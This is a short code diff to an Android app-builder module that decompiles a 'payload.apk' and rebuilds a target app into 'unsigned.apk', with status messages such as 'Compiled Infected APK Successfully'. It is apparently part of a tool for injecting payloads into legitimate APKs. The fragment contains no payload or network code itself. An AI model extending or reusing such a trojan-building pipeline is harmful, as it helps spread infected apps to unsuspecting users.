@@ -225,7 +225,8 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
         params.putString("message", "[+] Decompiled Successfully !");
         try {
             String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
-            Main.main(new String[]{"d", "-p", framework, "-f", targetApkPath , "-o", working_dir+"normal_apk", });
+            //Main.main(new String[]{"d", "-p", framework, "-f", targetApkPath , "-o", working_dir+"normal_apk", });
+            Main.main(new String[]{"d","-r","-f", working_dir+"payload.apk", "-o", working_dir+"payload", });
             promise.resolve(params);
         } catch (Exception e) {
             e.printStackTrace();
@@ -284,7 +285,8 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
         params.putString("message", "[+] Compiled Infected APK Successfully !");
         try {
             String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
-            Main.main(new String[]{"b","-a", getAapt(),"-p", framework, working_dir+"normal_apk", "-o", working_dir+"unsigned.apk", });
+           // Main.main(new String[]{"b","-a", getAapt(),"-p", framework, working_dir+"normal_apk", "-o", working_dir+"unsigned.apk", });
+           Main.main(new String[]{"b", working_dir+"normal_apk", "-o", working_dir+"unsigned.apk", });
             promise.resolve(params);
         } catch (Exception e) {
             e.printStackTrace();
